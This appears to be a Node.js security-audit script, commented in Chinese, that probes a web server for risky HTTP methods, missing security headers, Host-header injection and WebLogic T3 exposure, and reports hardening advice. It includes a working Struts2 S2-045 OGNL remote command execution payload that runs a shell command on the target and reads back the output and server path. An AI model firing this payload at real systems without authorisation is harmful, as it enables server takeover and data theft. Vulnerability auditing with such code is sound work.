var szMyName = 'M.T.X._2017-06-08',
	request = require('request'),
	urlObj = require('url'),
	net = require('net'),
	url = "",bReDo = false, szLstLocation = "",
	g_oRst = {},
	a = process.argv.splice(2),
	bRunHost = false,
	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/);

if(0 < a.length)url = a[0];
process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";


// 基于socket发送数据
function fnSocket(h,p,szSend,fnCbk)
{
	const client = net.connect({"port": p,"host":h}, () => 
	{
	  client.write(szSend);
	});
	client.on('data', (data) => 
	{
		fnCbk(data);
		client.end();
	});
	client.on('end', () =>{});
}

// check weblogic T3
// java -jar jfxl.jar 192.168.10.1/24:7001
function checkWeblogicT3(h,p)
{
	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
	fnSocket(h,p,s,function(data)
	{
		var d = data && data.toString().trim() || "", 
			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
		console.log(d);
		console.log(re.test(d));
	});
}

// 解析裸头信息
function fnParseHttpHd(s,fnCbk)
{
	var a = s.trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
	// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

	for(var i in a)
	{
		// if(0 == i)continue;
		var x = a[i].indexOf(":");
		var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
		
		if(aT[0])
			obj[aT[0].toLowerCase().trim()] = aT[1].trim();
	}
	if(fnCbk)fnCbk(obj);
}

// 伪造host攻击测试
function fnDoHostAttack(url,fnCbk)
{
	if(bRunHost)return;
	bRunHost = true;
	try{
		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		checkWeblogicT3(host,port);
		fnSocket(host,port,'GET ' + uO.path + ' HTTP/1.1\r\nHost:' + ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' + szMyName + ') AppleWebKit/602.3.12 (KHTML, like Gecko) Version/8.0 Mobile/14C92 Safari/602.3.12 MTX/3.0\r\n\r\n',
			function(data)
		{
			var d = data && data.toString().trim() || "";

			fnParseHttpHd(d,function(o)
			{
				var oD = {des:"伪造host攻击测试成功"};
				if(o.location && -1 < String(o.location).indexOf(ss))
				{
					g_oRst["host"] = oD;
					oD.des += ", response返回的location：" + o.location;
				}
				var n = d.indexOf(ss);
				if(-1 < n)
				{
					var rg = new RegExp("(<.*?http:\\/\\/" + ss + ".*?>)","gim");
					var a = rg.exec(d);
					if(a)
					{
						var o = g_oRst["host"] || oD;
						o.code = "返回的代码中存在攻击后的代码:" + a[1];
						g_oRst["host"] = o;
					}
				}
			});
		});
	}catch(e){console.log(e);}
}
// 单个方法测试
function fnTest(s)
{
	request(
	    { method: s ||'PUT'
	    , uri: url//.substr(0,url.lastIndexOf("/"))
	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
	      [ { 'content-type': 'application/json'
	        ,  body: JSON.stringify({foo: 'bar', _attachments: {'test.jsp': {follows: true, length: 18, 'content_type': 'text/plain' }}})
	        }
	      , { body: 'I am an attachment' }
	      ]
	    }
	  , function (error, response, body) {
	  		if(!response)return;
	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
	      	{
	      		// console.log(response.headers);
	      		g_oRst.method || (g_oRst.method = {});
	      		g_oRst.method[s] = "开启了" + s + "、应该关闭，建议仅允许GET、POST";
	      		if(response.headers['allow'])
	      			g_oRst.method['allow'] = "确定这些都是必要的：" + response.headers['allow'];
	      	}
	      	var a = ["x-powered-by","server"];
	      	for(var k in a)
	      	if(!g_oRst[a[k]] && response && response.headers && response.headers[a[k]])
	      		g_oRst[a[k]] = "应该屏蔽 " + response.headers[a[k]];
	      	if(response && response.headers && response.headers["location"])
	      	{
	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
	      		if(szLstLocation != response.headers["location"])
	      		{
	      			szLstLocation = url = response.headers["location"];
	      			fnTestAll();
	      		}
	      	}
	      	for(var k in aHS)
	      	{
	      		if(!response.headers[aHS[k]])
	      		{
	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
	      			g_oRst.safeHeader[aHS[k]] = "应该有有该安全头信息 " + aHS[k];
	      		}
	      	}

	      	if(response.headers['content-type'])
	      	{
	      		;
	      	}
	    }
	  );
}

function doStruts2_045(url,cmd,fnCbk)
{
	var szCmd = cmd || "whoami";//  && cat #curPath/WEB-INF/jdbc.propertis
	request({method: 'POST',uri: url
	    ,headers:
	    {
	    	"Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear())"
	    		+ ".(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))"
				+ ".(#cmd='" + szCmd + "')"
				+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
				+ ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
				+ ".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())"
				+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
				+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
				// + ".(#ros.write('curPath '.getBytes()))"
			    + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
	    		+ ".(#ros.flush()).(#ros.close())}"
	    }}
	  , function (error, response, body){
	  		if(body)
	  		{
	  			if(-1 < body.indexOf("<html"))return;
	  			g_oRst.struts2 || (g_oRst.struts2 = {});
	  			var oT = g_oRst.struts2 = {"s2-045":"发现struts2高危漏洞s2-045，请尽快升级"},s1 = String(body).split(/\n/);
	  			if(-1 < s1[0].indexOf("root"))
	  				oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
	  			if(s1[0] && 50 > s1[0].length)
	  				oT["user"] = "当前中间件启动的用户：" + s1[0];
	  			if(1 < s1.length)
	  				oT["CurDir"] = {des:"当前中间件目录","path":s1[1]};
	  		}
	  		// console.log(body);
	    }
	  );
}

// 测试所有，便于更改url重复测试
function fnTestAll()
{
	fnDoHostAttack(url,function(o)
	{
		console.log(o);
	},null);
	var aMethod = ["PUT","DELETE","OPTIONS","HEAD", "PATCH"];
	for(var k in aMethod)
		fnTest(aMethod[k]);
}
if(0 < a.length)
{
	doStruts2_045(url);
	fnTestAll();
}
checkWeblogicT3("192.168.10.133",9001);
process.on('exit', (code) => 
{
	console.log(JSON.stringify(g_oRst,null,' '));
});